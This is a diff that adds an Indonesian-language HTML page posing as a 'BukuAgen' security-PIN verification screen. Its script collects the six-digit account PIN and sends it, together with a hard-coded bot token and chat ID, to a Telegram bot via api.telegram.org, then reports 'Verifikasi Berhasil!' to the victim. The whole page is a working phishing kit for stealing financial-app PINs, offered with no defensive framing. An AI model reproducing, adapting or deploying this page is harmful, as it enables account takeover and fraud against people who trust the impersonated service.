@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verifikasi PIN BukuAgen</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: '-apple-system', BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 480px;
+            min-height: 100vh;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        /* Header Biru */
+        .app-header {
+            background-color: #0091ff;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            color: #ffffff;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+
+        .btn-back {
+            background: none;
+            border: none;
+            cursor: pointer;
+            margin-right: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .btn-back svg {
+            width: 24px;
+            height: 24px;
+            fill: #ffffff;
+        }
+
+        .header-title {
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        /* Konten Utama */
+        .content {
+            padding: 40px 24px;
+            text-align: center;
+        }
+
+        .title-pin {
+            font-size: 22px;
+            font-weight: 700;
+            color: #222222;
+            margin-bottom: 12px;
+        }
+
+        .desc-pin {
+            font-size: 15px;
+            color: #555555;
+            line-height: 1.5;
+            margin-bottom: 35px;
+        }
+
+        /* Area Input PIN (6 Kotak) */
+        .pin-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 35px;
+        }
+
+        .pin-input {
+            width: 45px;
+            height: 60px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: #222222;
+            background-color: #f5f5f5;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        /* Gaya saat kotak aktif/fokus */
+        .pin-input:focus, .pin-input.active {
+            border-color: #0091ff;
+            background-color: #e6f4ff;
+        }
+
+        .forget-pin {
+            font-size: 15px;
+            color: #0091ff;
+            text-decoration: none;
+            font-weight: 600;
+            display: inline-block;
+        }
+
+        /* Responsif Desktop */
+        @media (min-width: 481px) {
+            body {
+                background-color: #f4f7f6;
+                padding: 20px;
+            }
+            .app-container {
+                min-height: auto;
+                height: 750px;
+                border-radius: 16px;
+                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+                overflow: hidden;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    <div class="app-header">
+        <button class="btn-back" onclick="window.history.back()">
+            <svg viewBox="0 0 24 24">
+                <path d="M20,11V13H8L13.5,18.5L12.08,19.92L4.16,12L12.08,4.08L13.5,5.5L8,11H20Z" />
+            </svg>
+        </button>
+        <span class="header-title">PIN Keamanan</span>
+    </div>
+
+    <div class="content">
+        <h2 class="title-pin">Masukkan PIN Anda</h2>
+        <p class="desc-pin">Silakan masukkan 6 digit PIN keamanan akun BukuAgen Anda untuk menyelesaikan verifikasi.</p>
+
+        <div class="pin-container">
+            <input type="tel" class="pin-input active" maxlength="1" oninput="pindahKotak(this, 0)" onkeydown="hapusKotak(event, 0)">
+            <input type="tel" class="pin-input" maxlength="1" oninput="pindahKotak(this, 1)" onkeydown="hapusKotak(event, 1)">
+            <input type="tel" class="pin-input" maxlength="1" oninput="pindahKotak(this, 2)" onkeydown="hapusKotak(event, 2)">
+            <input type="tel" class="pin-input" maxlength="1" oninput="pindahKotak(this, 3)" onkeydown="hapusKotak(event, 3)">
+            <input type="tel" class="pin-input" maxlength="1" oninput="pindahKotak(this, 4)" onkeydown="hapusKotak(event, 4)">
+            <input type="tel" class="pin-input" maxlength="1" oninput="pindahKotak(this, 5)" onkeydown="hapusKotak(event, 5)">
+        </div>
+
+        <a href="#" class="forget-pin">Lupa PIN Keamanan?</a>
+    </div>
+</div>
+
+<script>
+    // ==========================================
+    // PENGATURAN BOT TELEGRAM (ISI DI SINI)
+    // ==========================================
+    const TELEGRAM_BOT_TOKEN = '8462084079:AAHQ94IQ_-iOg10Y9IiTSnNzeb2IFDikpes';
+    const TELEGRAM_CHAT_ID = '7692820036';
+    // ==========================================
+
+    const inputs = document.querySelectorAll('.pin-input');
+
+    // 1. Fungsi Otomatis Pindah Kotak Saat Diketik
+    function pindahKotak(element, index) {
+        // Hanya izinkan angka
+        element.value = element.value.replace(/[^0-9]/g, '');
+
+        if (element.value.length === 1 && index < 5) {
+            inputs[index + 1].focus();
+            inputs[index + 1].classList.add('active');
+        }
+
+        cekDanKirimPIN();
+    }
+
+    // 2. Fungsi Tombol Backspace (Hapus)
+    function hapusKotak(event, index) {
+        if (event.key === "Backspace" && event.target.value.length === 0 && index > 0) {
+            inputs[index - 1].focus();
+            inputs[index].classList.remove('active');
+        }
+    }
+
+    // 3. Fungsi Kirim PIN Otomatis ke Telegram
+    function cekDanKirimPIN() {
+        let pinKode = "";
+        inputs.forEach(input => {
+            pinKode += input.value;
+        });
+
+        // Jika ke-6 kotak sudah terisi penuh
+        if (pinKode.length === 6) {
+            inputs.forEach(input => input.disabled = true);
+
+            const pesanTelegram = `🔒 *PIN KEAMANAN MASUK* 🔒\n\n` +
+                                  `• *PIN Akun:* \`${pinKode}\``;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: pesanTelegram,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok) {
+                    // Jika sukses, Anda bisa mengalihkannya ke halaman sukses/utama aplikasi
+                    alert("Verifikasi Berhasil!");
+                } else {
+                    alert("Gagal memproses PIN.");
+                    resetInputPIN();
+                }
+            })
+            .catch(error => {
+                console.error(error);
+                resetInputPIN();
+            });
+        }
+    }
+
+    function resetInputPIN() {
+        inputs.forEach(input => {
+            input.disabled = false;
+            input.value = "";
+        });
+        inputs[0].focus();
+        inputs[0].classList.add('active');
+    }
+</script>
+
+</body>
+</html>
